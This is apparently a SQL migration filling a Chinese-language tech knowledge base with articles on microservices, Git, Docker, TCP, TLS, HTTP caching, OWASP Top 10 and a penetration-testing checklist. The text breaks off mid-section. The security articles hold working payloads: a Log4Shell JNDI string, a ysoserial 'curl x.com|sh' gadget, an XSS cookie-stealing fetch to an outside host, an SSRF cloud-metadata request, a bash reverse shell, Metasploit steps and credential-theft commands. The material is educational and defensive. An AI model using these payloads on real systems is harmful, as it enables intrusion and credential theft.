        ┌────────────────┼────────────────┐
        │                │                │
  ┌─────▼─────┐    ┌─────▼─────┐   ┌──────▼────┐
  │ 用户服务   │    │ 博客服务   │   │ Agent 服务 │
  │ user-svc  │    │ blog-svc  │   │ agent-svc  │
  └─────┬─────┘    └─────┬─────┘   └──────┬────┘
        │   OpenFeign 调用  │                │
        └────────────────────────────────────┘
                         │
              ┌──────────┴──────────┐
              │  Nacos 注册 + 配置  │
              └─────────────────────┘
                         │
              ┌──────────┴──────────┐
              │  Supabase (PG+Auth) │
              └─────────────────────┘
```

## 二、服务注册与发现
- Nacos：注册中心 + 配置中心二合一。
- 服务启动向 Nacos 注册自己的 IP:Port + 元数据。
- 调用方从 Nacos 拉取实例列表，本地负载均衡（Ribbon/LoadBalancer）选一个。
- 健康检查：心跳 5s，15s 未续约标记不健康，30s 摘除。

```yaml
spring:
  cloud:
    nacos:
      discovery:
        server-addr: ${NACOS:127.0.0.1:8848}
        namespace: ${NAMESPACE:public}
```

## 三、配置中心
- 应用启动从 Nacos 拉取 `application.yml`，热更新通过长轮询感知。
- 敏感信息（密钥、DB 密码）用 Nacos 加密 + 环境变量覆盖，不入 Git。

```java
@RefreshScope
@RestController
public class Cfg {
  @Value("${blog.title}") String title;
  @GetMapping("/title") String get(){ return title; }
}
```

## 四、网关
Spring Cloud Gateway 基于 Reactor（Netty），核心三件套：Route + Predicate + Filter。
```yaml
spring:
  cloud:
    gateway:
      routes:
        - id: blog
          uri: lb://blog-svc
          predicates: [Path=/api/blog/**]
          filters:
            - StripPrefix=2
            - name: RequestRateLimiter
              args: { redis-rate-limiter.replenishRate: 10, redis-rate-limiter.burstCapacity: 20 }
```
职责：路由、鉴权、限流、熔断、日志、跨域、灰度。

## 五、OpenFeign 跨服务调用
```java
@FeignClient(name = "user-svc", fallback = UserFallback.class)
public interface UserClient {
  @GetMapping("/users/{id}")
  UserDto getById(@PathVariable Long id);
}
```
Feign 把 HTTP 调用伪装成本地方法，配合 Sentinel 做熔断降级。

## 六、熔断限流
Sentinel 三态：CLOSED（正常）→ OPEN（错误率超阈值，直接拒绝）→ HALF_OPEN（试探放行）。
限流算法：固定窗口 / 滑动窗口 / 令牌桶 / 漏桶。生产常用令牌桶（Guava RateLimiter / Redis Lua）。

## 七、本博客实际架构
- **前端**：Next.js 静态导出，托管在 CDN（Vercel/Cloudflare Pages）。
- **后端**：
  - 用户/认证：Supabase Auth（JWT、OAuth）。
  - 数据：Supabase Postgres（kb_entries、posts、quant_* 表）。
  - Agent 服务：Node + Vercel AI SDK + AI Gateway。
  - 定时任务：Supabase Edge Functions / pg_cron（quant 行情采集）。
- **基础设施**：
  - Nginx 反向代理 + HTTPS（见运维分类）。
  - Docker Compose 编排后端服务。
  - Tailscale 远程运维通道（见运维分类）。
- **可观测**：日志写到 Postgres、Grafana 看板。

## 八、微服务踩坑清单
- **不要为了拆而拆**：小项目单体更快，团队 <10 人慎上微服务。
- **分布式事务**：优先用最终一致性（Saga + 补偿），少用 2PC。
- **链路追踪**：TraceId 必须贯穿，否则排障地狱。Spring Cloud Sleuth + Zipkin。
- **配置漂移**：一切配置走配置中心，禁止改本机文件后不回写。
- **优雅上下线**：注册中心摘除后再关进程，避免流量打到死亡实例。
$md$ where slug = 'sw-microservice-architecture-of-site';

update public.kb_entries set content = $md$# Git 工作流与救命命令

## 一、Git 内部模型
Git 不是"文件差异"，而是"快照 + 指针"的三层对象：
```
blob  → 文件内容（按内容 SHA1 命名）
tree  → 目录（指向若干 blob 或子 tree）
commit→ 指向一个 tree + parent + author + msg
ref   → 指向 commit（branch/tag/HEAD）
```
- `.git/objects/` 存所有对象，`zlib` 压缩。
- branch 只是一个文件 `refs/heads/main` 里写着某 commit 的 SHA。
- HEAD 是 `refs/heads/main` 的指针，`git checkout` 改的是 HEAD。

```bash
# 看对象内容
git cat-file -p HEAD                # 看 commit
git cat-file -p <tree-sha>          # 看 tree
git ls-files --stage               # 暂存区
```

## 二、分支策略

| 策略 | 主干 | 长期分支 | 适用 |
|---|---|---|---|
| Git Flow | main + develop | feature/release/hotfix | 有发布周期的产品 |
| GitHub Flow | main | feature 短期 | 持续部署的 Web |
| Trunk-Based | main | 个人 topic < 1 天 | 高频发布大团队 |

实战经验：小团队用 GitHub Flow，PR 评审合 main，main 永远可发布；release 打 tag。

## 三、日常命令
```bash
git status -sb                      # 紧凑分支状态
git log --oneline --graph --all -20 # 图形化
git diff --staged                   # 看暂存区
git commit --amend                  # 改最近一次 commit（未 push）
git rebase -i HEAD~5                # 压缩/重排最近 5 个
git stash -u                        # 含未跟踪
git stash list / pop / drop
git cherry-pick <sha>               # 把某 commit 摘到当前分支
```

## 四、救命：reset / reflog
```bash
# 误 commit 后想撤回（保留改动）
git reset --soft HEAD~1             # 撤 commit，改动留暂存
git reset --mixed HEAD~1            # 撤 commit + 暂存（默认）
git reset --hard HEAD~1             # ⚠️ 彻底丢改动

# reflog：救命稻草，所有 HEAD 移动都记着
git reflog
git reset --hard HEAD@{5}           # 跳回 5 步前
```
注意：`reset --hard` 之前永远先 `git stash` 或 `git branch backup`。

## 五、救命：bisect 二分找引入 bug 的 commit
```bash
git bisect start
git bisect bad          # 当前是坏的
git bisect good v1.2.0  # 这个版本是好的
# git 自动 checkout 中间版本，你测试后告诉它：
git bisect good         # 或 bad
# 几轮后定位到第一个坏 commit
git bisect reset
```
工程上：写个脚本 `./test.sh` 返回 0/1，`git bisect run ./test.sh` 全自动。

## 六、救命：rebase 冲突
```bash
git pull --rebase           # 拉远端并 rebase，避免 merge 噪声
# 冲突时：
git status                  # 看哪些文件冲突
# 手动编辑解决 <<<< >>>>
git add <file>
git rebase --continue
# 想放弃：
git rebase --abort
```
原则：**已 push 的 commit 不要 rebase**（除非是自己的 feature 分支且团队约定）。

## 七、大文件与历史
```bash
# 看谁贡献了多少行
git log --format='%aN' | sort | uniq -c | sort -rn
# 找最大文件历史
git rev-list --objects --all | sort -k 2 | \
  git cat-file --batch-check='%(objectsize) %(rest)' | sort -n | tail

# 用 git-filter-repo 清大文件（替代老 filter-branch）
pip install git-filter-repo
git filter-repo --path bigfile.zip --invert-paths
```

## 八、实战场景速查
- **误删分支**：`git reflog` 找 SHA → `git branch recovered <sha>`。
- **想撤已 push 的 commit**：`git revert <sha>`（生成反向 commit，安全）；不要 `push --force` 到 main。
- **想合并多个 commit**：`git rebase -i HEAD~N` 选 squash。
- **只想拿某个文件的某个版本**：`git checkout <sha> -- path/file`。
- **看某行是谁写的**：`git blame file`；IDE 集成更直观。
- **submodule 拉不全**：`git submodule update --init --recursive`。
$md$ where slug = 'sw-git-workflow-survival';

update public.kb_entries set content = $md$# Docker 到 docker compose：把环境装进集装箱

## 一、Docker 原理三件套
Docker 不是虚拟机，而是 Linux 内核特性的封装：
1. **namespace**：隔离视图。PID/NET/MNT/IPC/UTS/USER，让容器以为自己独占系统。
2. **cgroup**：限制资源。CPU/内存/IO/设备，防止单容器吃光宿主。
3. **unionfs**：分层文件系统。`overlay2` 把镜像多层叠加，写时复制。

```
应用层（可写）
─────────────
镜像层 N (基础镜像)
镜像层 N-1 (apt install)
镜像层 N-2 (COPY src)
镜像层 N-3 (RUN build)
```
每层只读，容器在顶层加一个可写层，删容器数据即丢。

## 二、Dockerfile 最佳实践
```dockerfile
# 多阶段构建：构建产物与运行环境分离
FROM golang:1.22 AS builder
WORKDIR /src
COPY go.mod go.sum ./
RUN go mod download           # 依赖层单独缓存
COPY . .
RUN CGO_ENABLED=0 go build -ldflags="-s -w" -o /app .

FROM gcr.io/distroless/static
COPY --from=builder /app /app
USER nonroot:nonroot
ENTRYPOINT ["/app"]
```
要点：
- 用小基础镜像（alpine / distroless / scratch）。
- 把不变的层（依赖）放前面，利用缓存。
- 多阶段构建让最终镜像不含编译器与源码。
- `.dockerignore` 排除 `.git node_modules dist`。
- 容器即进程：一个容器一个前台进程。

## 三、ENTRYPOINT vs CMD
```dockerfile
# CMD 易被 docker run 覆盖
CMD ["nginx", "-g", "daemon off;"]

# ENTRYPOINT 固定入口，CMD 当默认参数
ENTRYPOINT ["nginx"]
CMD ["-g", "daemon off;"]
# docker run img -t          → nginx -t
```
脚本型 ENTRYPOINT 用 `exec "$@"` 接管 PID 1 接收信号：
```bash
#!/bin/sh
# 做点初始化...
exec "$@"   # 关键：让应用成为 PID 1，能收到 SIGTERM
```

## 四、数据卷与持久化
```bash
# 命名卷（推荐，由 Docker 管理生命周期）
docker volume create pg_data
docker run -v pg_data:/var/lib/postgresql/data postgres

# 绑定挂载（开发常用，但权限坑多）
docker run -v $(pwd)/src:/app node npm run dev
```
坑：
- 绑定挂载在 Windows/Mac 上有文件权限与性能问题，生产用命名卷。
- 不要把数据库数据写在容器层，删容器即丢。
- 备份：`docker run --rm -v pg_data:/data -v $PWD:/backup alpine tar czf /backup/pg.tgz /data`。

## 五、网络模式

| 模式 | 说明 | 场景 |
|---|---|---|
| bridge | 默认，docker0 网桥，NAT | 容器间 + 对外端口映射 |
| host | 共享宿主网络栈 | 性能敏感、本地开发 |
| none | 无网络 | 离线计算 |
| container:xx | 复用某容器网络 | sidecar 共享网络栈 |
| 自定义 bridge | 用户定义、DNS 自动解析 | 多服务互通推荐 |

```bash
docker network create appnet
docker run -d --name db --network appnet -e POSTGRES_PASSWORD=x postgres
docker run -d --name app --network appnet myapp
# app 容器内可直接 ping db（DNS 自动解析）
```

## 六、docker-compose.yml 完整示例
```yaml
services:
  db:
    image: postgres:16-alpine
    environment:
      POSTGRES_PASSWORD: ${DB_PASS}
      POSTGRES_DB: blog
    volumes: [pg_data:/var/lib/postgresql/data]
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U postgres"]
      interval: 10s
      retries: 5

  app:
    build: .
    depends_on:
      db: { condition: service_healthy }
    environment:
      DATABASE_URL: postgresql://postgres:${DB_PASS}@db:5432/blog
    ports: ["8080:8080"]
    restart: unless-stopped
    deploy:
      resources:
        limits: { cpus: "1.0", memory: 512M }

  nginx:
    image: nginx:alpine
    volumes: ["./nginx.conf:/etc/nginx/nginx.conf:ro"]
    ports: ["80:80", "443:443"]
    depends_on: [app]

volumes:
  pg_data:
```
```bash
docker compose up -d --build
docker compose logs -f app
docker compose exec app sh
docker compose down -v   # ⚠️ -v 删卷
```

## 七、常见坑
- **权限错误**：容器内 uid 与宿主不一致，绑定挂载读不了。`chown` 或设 `user:`。
- **OOM killed**：内存限制太小，看 `docker inspect` 的 OOMKilled。
- **磁盘满**：`docker system prune -a --volumes` 清悬挂镜像与停止容器。
- **构建慢**：`.dockerignore` 没写好，每次 COPY 触发后续层失效。
- **时区**：默认 UTC，加 `TZ=Asia/Shanghai` 或挂 `/etc/localtime`。
$md$ where slug = 'sw-docker-compose-in-practice';

-- ============ 网络工程 ============

update public.kb_entries set content = $md$# TCP 三次握手/四次挥手与状态机

## 一、TCP 状态机
```
                        ┌──────────┐  主动 open (send SYN)
                        │  CLOSED  │
                        └────┬─────┘
                             │
                       ┌─────▼─────┐
              recv SYN │   LISTEN  │
              send ACK │ACK+SYN   │
              ┌────────┴──────────┘
              │
        ┌─────▼─────┐  recv ACK   ┌──────────┐
        │ SYN_RCVD  │ ───────────→ │ESTABLISHED│
        └───────────┘              └─────┬────┘
                                         │ 主动 close (send FIN)
                                   ┌─────▼─────┐ recv FIN+ACK
                                   │ FIN_WAIT_1│ ──────────→ ┌──────────┐
                                   └─────┬─────┘              │CLOSE_WAIT│
                                    recv ACK                   └─────┬────┘
                                   ┌─────▼─────┐  app close     │
                                   │ FIN_WAIT_2│ ──────────→   │
                                   └─────┬─────┐               │
                                    recv FIN+ACK               │
                                   ┌─────▼─────┐ ───time wait──→┌──────────┐
                                   │TIME_WAIT  │  2MSL         │LAST_ACK  │
                                   └─────┬─────┘               └─────┬────┘
                                         │ recv ACK                  │
                                         ▼                          ▼
                                    ┌──────────┐             ┌──────────┐
                                    │  CLOSED  │             │  CLOSED  │
                                    └──────────┘             └──────────┘
```

## 二、三次握手详解
```
Client                            Server
  │                                 │
  │ ── SYN, seq=x ────────────────→│   SYN_RCVD
  │                                 │
  │ ←── SYN+ACK, seq=y, ack=x+1 ──│
  │                                 │
  │ ── ACK, ack=y+1 ──────────────→│   ESTABLISHED
  │                                 │
```
- SYN 占一字节序号空间，所以 `ack = seq + 1`。
- 全连接队列 = accept 队列；半连接队列 = SYN_RCVD 集合。
- `syncookies` 在队列满时用密码学回包，不存状态，防 SYN Flood。

## 三、四次挥手详解
```
Client                            Server
  │ ── FIN, seq=u ────────────────→│  FIN_WAIT_1 / CLOSE_WAIT
  │ ←── ACK, ack=u+1 ─────────────│  FIN_WAIT_2
  │                                 │   (服务端处理剩余数据)
  │ ←── FIN, seq=v ────────────────│  LAST_ACK
  │ ── ACK, ack=v+1 ──────────────→│  TIME_WAIT → CLOSED
```
- FIN 也占一字节序号空间。
- 主动方进入 TIME_WAIT，等 2MSL（Linux 默认 60s）。

## 四、TIME_WAIT 的作用
1. **保证最后那个 ACK 到达**：如果丢，被动方重发 FIN，主动方还能回 ACK。
2. **让旧连接的延迟报文消失**：2MSL 内同四元组不复用，防串包。

副作用：短连接高并发时堆积大量 TIME_WAIT 耗端口。优化：
- `net.ipv4.tcp_tw_reuse=1`：新连接复用 TIME_WAIT 端口（client 端）。
- 用长连接 / 连接池，从根上少建短连接。
- **不要开 `tcp_tw_recycle`**（NAT 环境会导致连接被丢，4.12 后已删除）。

## 五、半连接 / 全连接队列
- 半连接（SYN_RCVD）队列：`net.ipv4.tcp_max_syn_backlog`。
- 全连接（ESTABLISHED 待 accept）队列：`listen(fd, backlog)` 与 `somaxconn` 取小。
- 队列满后：默认丢 SYN；开 `tcp_syncookies` 时用 cookie 续命。

```bash
ss -lnt                              # 看 Send-Q（队列上限）与 Recv-Q（当前积压）
sysctl net.ipv4.tcp_max_syn_backlog
sysctl net.core.somaxconn
```

## 六、SYN Flood 攻击
攻击者发海量伪造源 IP 的 SYN，塞满半连接队列，正常用户握手不上。
防御：
- `tcp_syncookies=1`：队列满时用 cookie，不存半连接状态。
- 前端 SYN 代理 / 防火墙限速。
- 调大 `tcp_max_syn_backlog`。

## 七、抓包实战
```bash
# 抓 80 端口握手
sudo tcpdump -i any -nn 'tcp port 80 and (tcp[tcpflags] & tcp-syn != 0)' -c 10

# 抓某连接全流程
sudo tcpdump -i any -nn host 1.2.3.4 and port 80 -w cap.pcap
# 用 wireshark 打开，Filter: tcp.port==80 看握手/挥手时序
```
Wireshark 看 TCP 流：右键 Follow → TCP Stream，可看应用数据；Statistics → Flow Graph 看时序图。

## 八、连接异常状态
- **大量 SYN_RCVD**：被 SYN Flood 或服务 accept 不及时。
- **大量 CLOSE_WAIT**：程序没 close()，连接泄漏，是应用 bug。
- **大量 FIN_WAIT_2**：对端不回 FIN，常是半边挂了或防火墙静默丢包。
$md$ where slug = 'net-tcp-handshake-state-machine';

update public.kb_entries set content = $md$# HTTPS/TLS 握手全流程与证书体系

## 一、TLS 1.2 握手（2 RTT）
```
Client                                     Server
  │ ── ClientHello ────────────────────────→│
  │   (TLS版本, 随机数 random_c, 密码套件列表, SNI)
  │ ←──────────────────── ServerHello ──────│
  │   (选定的版本, 随机数 random_s, 选定密码套件)
  │ ←──────────────────── Certificate ──────│
  │   (服务器证书链)
  │ ←──────────────────── ServerKeyExchange │  (ECDHE 参数 + 签名)
  │ ←──────────────────── ServerHelloDone ──│
  │ ── ClientKeyExchange ───────────────────→│  (ECDHE 公钥)
  │ ── ChangeCipherSpec ───────────────────→│
  │ ── Finished(加密) ───────────────────→│
  │ ←──────────────── ChangeCipherSpec ────│
  │ ←──────────────── Finished(加密) ──────│
  │ ════════════ 应用数据(对称加密) ═══════│
```
密钥推导：`ECDHE(客户端私钥, 服务端 ECDHE 公钥)` → pre-master → 用 `random_c + random_s` 派生出会话密钥。

## 二、TLS 1.3 握手（1 RTT）
- 合并 ServerHello 与 KeyExchange，首次握手 1 RTT 即可发应用数据。
- 0-RTT（PSK 模式）：客户端复用之前会话密钥，发 ClientHello 时就带加密的应用数据。
- 强制前向保密（PFS）：丢弃 RSA 密钥交换，全用 ECDHE。
- 砍掉一堆不安全算法（RC4/3DES/CBC 等）。

## 三、证书链验证
```
根 CA (Root, 自签, 预置在 OS/浏览器)
  └─ 中间 CA (Intermediate)
       └─ 服务器证书 (leaf)
```
验证步骤：
1. 拿到 leaf 证书，检查有效期、域名（SAN）、用途。
2. 用链中上一级 CA 的公钥验 leaf 签名。
3. 递归向上，直到根 CA 在信任库中。
4. 任一步失败 → 浏览器报 `NET::ERR_CERT_AUTHORITY_INVALID` 等。

吊销检查：CRL（证书吊销列表，过时）/ OCSP（在线状态查询）/ OCSP Stapling（服务端把 OCSP 响应钉在握手包里）。

## 四、证书类型

| 类型 | 校验维度 | 适用 |
|---|---|---|
| DV | 仅域名所有权 | 个人博客、Let's Encrypt 免费 |
| OV | 域名 + 组织身份 | 企业官网 |
| EV | 严格组织审核（已取消绿色条） | 金融、政务 |
| 通配符 `*.a.com` | 一个子域段 | 多子站点 |
| 多域名 SAN | 多个域名写一张 | SaaS |

## 五、证书格式
- **PEM**：Base64 文本，`-----BEGIN CERTIFICATE-----`，最常见（Nginx/Apache）。
- **DER**：二进制，Java 偏爱 `.cer`。
- **PKCS12 / .pfx**：含私钥 + 证书，密码保护，Windows/IIS 用。
- **CSR**：证书签名请求，含公钥 + 主体信息，给 CA 签。
- **Key**：私钥，`-----BEGIN PRIVATE KEY-----`，权限 600。

## 六、自签名证书与本地 HTTPS
```bash
# 1. 生成私钥
openssl genrsa -out ca.key 4096

# 2. 自签根 CA
openssl req -x509 -new -nodes -key ca.key -sha256 -days 3650 \
  -subj "/CN=My Local CA" -out ca.crt

# 3. 生成服务私钥 + CSR
openssl genrsa -out server.key 2048
openssl req -new -key server.key \
  -subj "/CN=blog.local" -out server.csr

# 4. 用 CA 签 server 证书（带 SAN）
cat > san.cnf <<EOF
[req]
distinguished_name=req
[san]
subjectAltName=DNS:blog.local,IP:127.0.0.1
EOF
openssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial \
  -days 825 -sha256 -extfile san.cnf -extensions san -out server.crt

# 5. 把 ca.crt 导入系统/浏览器信任库，访问 https://blog.local 即可信
```
生产用 Let's Encrypt（acme.sh / certbot）自动签发续期，零成本。

## 七、ECDHE 为什么前向保密
- ECDHE 每次握手双方都生成临时私钥，会话密钥不落盘。
- 即使服务端 RSA 静态私钥以后被泄露，也无法解密历史流量（前向保密 PFS）。
- TLS 1.2 用 RSA 密钥交换的旧套件没有 PFS，已废弃；TLS 1.3 强制 ECDHE。

## 八、调试
```bash
# 看握手全流程
openssl s_client -connect example.com:443 -servername example.com -showcerts
# 看证书详情
openssl x509 -in server.crt -noout -text
# 验证链
openssl verify -CAfile ca.crt server.crt
# 测支持的密码套件
nmap --script ssl-enum-ciphers -p 443 example.com
```
$md$ where slug = 'net-https-tls-handshake-certificates';

update public.kb_entries set content = $md$# HTTP 缓存、跨域与状态码实战

## 一、强缓存 vs 协商缓存

| 类型 | 头部 | 行为 |
|---|---|---|
| 强缓存 | `Cache-Control` / `Expires` | 命中直接用本地，不发请求 |
| 协商缓存 | `ETag` + `If-None-Match` / `Last-Modified` + `If-Modified-Since` | 发请求问服务器，304 才用本地 |

## 二、Cache-Control 关键指令
```
Cache-Control: public, max-age=31536000, immutable
Cache-Control: no-cache          # 必须问服务器（协商）
Cache-Control: no-store          # 完全不存
Cache-Control: private, max-age=60
```
- `max-age`：相对秒数，优先级高于 `Expires`。
- `immutable`：在 max-age 内不会发刷新请求（Chrome/Firefox 支持）。
- `no-cache` ≠ 不缓存，是"用之前必问"。
- `no-store` 才是真不缓存（敏感数据）。

## 三、ETag 协商缓存
第一次响应：`ETag: "abc123"`。
后续请求：`If-None-Match: "abc123"`。
服务器比对：一致返回 304 + 空 body；不一致返回 200 + 新内容。

文件指纹方案：构建工具给静态文件加 hash（`app.3f9a.js`），配 `max-age=31536000, immutable`，永久强缓存；改名即失效。

## 四、Nginx 缓存配置
```nginx
proxy_cache_path /var/cache/nginx levels=1:2 keys_zone=api:10m
                 max_size=1g inactive=10m use_temp_path=off;

server {
  location /api/ {
    proxy_cache api;
    proxy_cache_key "$scheme$host$request_uri";
    proxy_cache_valid 200 10m;
    proxy_cache_valid 404 1m;
    # 加响应头观察命中
    add_header X-Cache-Status $upstream_cache_status;
    # 后端不缓存就跳过
    proxy_cache_bypass $http_authorization;
    proxy_no_cache $http_authorization;
  }
}
```
`$upstream_cache_status` 取值：MISS / HIT / EXPIRED / BYPASS / STALE。

## 五、CORS 跨域
浏览器同源策略：协议+域名+端口任一不同即跨域。跨域请求分两种：

**简单请求**（GET/HEAD/POST 且Content-Type 为表单等）：直接发，浏览器在响应里看 `Access-Control-Allow-Origin`。

**预检请求**（其它方法、自定义头、JSON 等）：先发 OPTIONS：
```
OPTIONS /api HTTP/1.1
Origin: https://a.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: X-Token
```
服务端回：
```
Access-Control-Allow-Origin: https://a.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, X-Token
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400
```
通过后浏览器才发真实请求。`Allow-Credentials: true` 时 `Allow-Origin` 不能为 `*`，必须精确域名。

## 六、Express CORS 中间件
```javascript
const express = require('express');
const cors = require('cors');
const app = express();

const whitelist = ['https://a.com', 'https://b.com'];
app.use(cors({
  origin(origin, cb) {
    if (!origin || whitelist.includes(origin)) return cb(null, true);
    cb(new Error('Not allowed by CORS'));
  },
  credentials: true,
  maxAge: 86400,
}));

app.options('/api/*', cors());  // 预检
app.put('/api/x', cors(), (req, res) => res.json({ok:1}));
```
坑：
- Cookie 跨域要同时：① `credentials: true`；② 前端 `fetch(url, {credentials:'include'})`；③ 后端 `Allow-Origin` 写精确域名；④ Cookie 设 `SameSite=None; Secure`。

## 七、状态码完整表

| 类别 | 码 | 含义 |
|---|---|---|
| 1xx | 100 | Continue（预检后继续） |
| 2xx | 200 / 201 / 204 | OK / 创建成功 / 无内容 |
| 3xx | 301 / 302 / 304 / 307 / 308 | 永久重定向 / 临时重定向 / 未修改 / 临时保留方法 / 永久保留方法 |
| 4xx | 400 / 401 / 403 / 404 / 405 / 409 / 429 | 参数错 / 未认证 / 禁止 / 不存在 / 方法不允许 / 冲突 / 限流 |
| 5xx | 500 / 502 / 503 / 504 | 服务器错 / 网关错 / 不可用 / 网关超时 |

## 八、常见排查
- **改了静态文件不更新**：没加 hash 或 max-age 太大，强缓存没失效。改文件名或 dev 关缓存。
- **304 太多导致慢**：协商虽省流量但仍有 RTT，重要资源用强缓存（max-age 长 + 文件指纹）。
- **CORS 预检失败**：看 OPTIONS 是否 200、Allow-Origin 是否匹配、是否缺 Allow-Headers。
- **生产 304 / 200 but 缓存错版本**：CDN 回源策略没配好，看 `X-Cache` 头。
$md$ where slug = 'net-http-cache-cors-status';

-- ============ 网络安全 ============

update public.kb_entries set content = $md$# OWASP Top 10 与最小验证 PoC

## 一、A01 权限控制失效（Broken Access Control）
**原理**：服务端没校验当前用户能否访问该资源，靠改 ID 越权。
**PoC**：
```
GET /api/orders/1001   # 自己的
GET /api/orders/1002   # 改个 ID 就看到别人订单 → 漏洞
```
**防御**：每次访问资源都校验 owner；用不可枚举的 UUID；服务端鉴权 + 接口分级。

## 二、A02 加密失败（Cryptographic Failures）
**原理**：明文传输、弱算法、密钥硬编码。
**PoC**：抓包见 `password=123456` 明文；MD5 存密码。
**防御**：全站 HTTPS；密码用 bcrypt/argon2；敏感数据加密用 AES-GCM；密钥放 KMS / 环境变量。

## 三、A03 注入（Injection）
**原理**：拼接 SQL/命令，恶意输入改变语义。
**SQL 注入 PoC**：
```
login: admin'--
pw:   anything
→ SQL: select * from users where name='admin'--' and pw='...'  # 注释掉密码校验
```
**防御**：参数化查询 / ORM；最小权限账号；输入白名单。

## 四、A04 不安全设计
**原理**：业务逻辑设计缺陷，如无限重试、可枚举 ID。
**PoC**：验证码接口 `/sms?phone=` 无频控，刷一万条。
**防御**：限流、风控、防重放 token、幂等键。

## 五、A05 安全配置错误
**原理**：默认配置、目录列出、debug 模式、S3 桶公开。
**PoC**：访问 `/actuator/env` 暴露配置；`/.git/config` 拿源码。
**防御**：生产关 debug；删默认账号；最小化端口暴露；安全基线扫描。

## 六、A06 脆弱组件
**原理**：依赖有已知 CVE。
**PoC**：Log4Shell（CVE-2021-44228）：`${jndi:ldap://x.com/Exploit}` 触发远程类加载。
**防御**：`npm audit` / `snyk test` / OWASP Dependency-Check；锁定版本；CI 强制阻断高危。

## 七、A07 身份认证失败
**原理**：弱密码、可爆破、session 固定、JWT 无验签。
**PoC**：`hydra -L u -P p ssh://target`；JWT 把 `alg` 改 `none` 绕过。
**防御**：限流 + 验证码；多因素 MFA；session 重生成；JWT 强制 RS256 + 过期。

## 八、A08 软件与数据完整性失败
**原理**：未校验的反序列化、未签名更新。
**PoC**（Java 反序列化）：
```
向 /api/deserialize 发序列化 gadget chain，触发 RCE。
ysoserial generate CommonsCollections1 'curl x.com|sh'
```
**防御**：禁用 Java 原生序列化；用 JSON；白名单类；签名校验更新包。

## 九、A09 日志与监控失败
**原理**：没日志、没告警，被打了不知道。
**防御**：关键操作打日志（登录、转账、删除）；接入 SIEM；异常告警；定期审计。

## 十、A10 服务端请求伪造（SSRF）
**原理**：服务端代发请求，目标可被控制，访问内网 / 元数据。
**PoC**：
```
POST /api/fetch
{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
→ 返回云厂商临时凭证，接管账号
```
**防御**：URL 白名单（协议/域名/IP）；禁内网段；DNS 重绑定防护；隔离出口。

## 十一、XSS（跨站脚本）
**原理**：未转义的用户输入回显到页面。
**PoC**：留言框输入 `<script>fetch('//x.com?c='+document.cookie)</script>`，他人访问触发。
**防御**：输出按上下文转义（HTML/JS/URL）；CSP `default-src 'self'`；HttpOnly Cookie。

## 十二、CSRF
**原理**：诱导用户在已登录站点发请求。
**PoC**：钓鱼页 `<img src="https://bank.com/transfer?to=hacker&amt=1000">`。
**防御**：CSRF Token；SameSite=Lax/Strict Cookie；关键操作二次确认。

## 十三、防御总原则
- 默认拒绝，白名单优先。
- 不信任任何输入（包括 Cookie、Header、URL）。
- 纵深防御：WAF + 应用校验 + 数据库权限 三层。
- 安全左移：CI 跑 SAST/DAST/SCA，PR 阶段拦截。
$md$ where slug = 'sec-owasp-top10-poc-notes';

update public.kb_entries set content = $md$# 渗透测试标准流程 Checklist

## 一、流程总览
```
信息收集 → 扫描 → 枚举 → 漏洞利用 → 后渗透 → 报告
   ↓          ↓        ↓         ↓          ↓        ↓
 OSINT    nmap    目录/用户    exploit    提权/横向    记录/复测
```
原则：**最小授权、最小破坏、留痕、书面授权**。未授权测试即违法。

## 二、信息收集（OSINT）
```bash
# 域名资产
whois example.com
dig any example.com
# 子域
subfinder -d example.com -all -recursive
amass enum -d example.com
# 证书透明日志（找子域）
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sort -u
# 搜索引擎 dork
# site:example.com filetype:pdf
# site:example.com inurl:admin
# 历史快照
waybackurls example.com
# GitHub 泄密
gitdorks_go / trufflehog
```

## 三、扫描与端口
```bash
# 全端口快扫
nmap -p- --min-rate 5000 -T4 10.0.0.5
# 服务版本 + 脚本
nmap -sV -sC -p- 10.0.0.5 -oA scan
# UDP
nmap -sU --top-ports 100 10.0.0.5
# 系统识别
nmap -O 10.0.0.5
# Web 指纹
whatweb -a3 https://example.com
wpscan --url https://example.com --enumerate ap,at,u
```

## 四、目录与用户枚举
```bash
# 目录爆破
ffuf -u https://example.com/FUZZ -w wordlist.txt -mc 200,301,403 -ac
gobuster dir -u https://example.com -w big.txt
# 字典：SecLists
# /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# 虚拟主机枚举
ffuf -H "Host: FUZZ.example.com" -u http://10.0.0.5 -w vhosts.txt -fs 1234
# 用户枚举
kerbrute userenum -d corp.local users.txt
```
提示：401/403 别放弃，试加头（`X-Forwarded-For: 127.0.0.1`、`X-Custom-IP-Authorization: 127.0.0.1`）。

## 五、Web 漏洞探测
- **注入**：sqlmap。
  ```bash
  sqlmap -u "https://x.com/item?id=1" --batch --dbs --random-agent
  sqlmap -u "..." --forms --crawl=2
  ```
- **XSS / 目录 / 参数**：Burp Suite 主动扫描；ParamSpider 找隐藏参数。
- **SSRF / 文件读取**：手工 + ffuf 字典。
- **逻辑漏洞**：手工，重点看权限、价格、限量、并发。

## 六、漏洞利用
```bash
# 漏洞库查
searchsploit apache 2.4  # 本地 ExploitDB
msfconsole
msf> search name:log4shell
msf> use exploit/multi/http/log4shell_header_injection
msf> set RHOSTS 10.0.0.5
msf> set LHOST 10.0.0.10
msf> exploit
# 反弹 shell
bash -i >& /dev/tcp/10.0.0.10/4444 0>&1
nc -lvnp 4444   # 攻击机监听
```
 stabilization：拿到 shell 先做：
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z 后 stty raw -echo; fg; reset
```

## 七、后渗透
- **本地信息**：`id; uname -a; sudo -l; cat /etc/passwd; crontab -l; find / -perm -4000 2>/dev/null`（SUID 提权）。
- **横向**：抓 `~/.ssh/id_rsa`、`history`、配置文件密码；ARP 扫内网。
- **提权**：linpeas / linux-smart-enumeration 自动枚举；GTFOBins 查 SUID 二进制。
- **凭据**：`mimikatz`（Windows）、`/etc/shadow` 离线 john / hashcat。

## 八、Windows 渗透要点
```powershell
# 信息
systeminfo
net user /domain
net group "Domain Admins" /domain
# BloodHound 画域内关系
bloodhound-python -d corp.local -u user -p pass -c All
# Kerberoasting
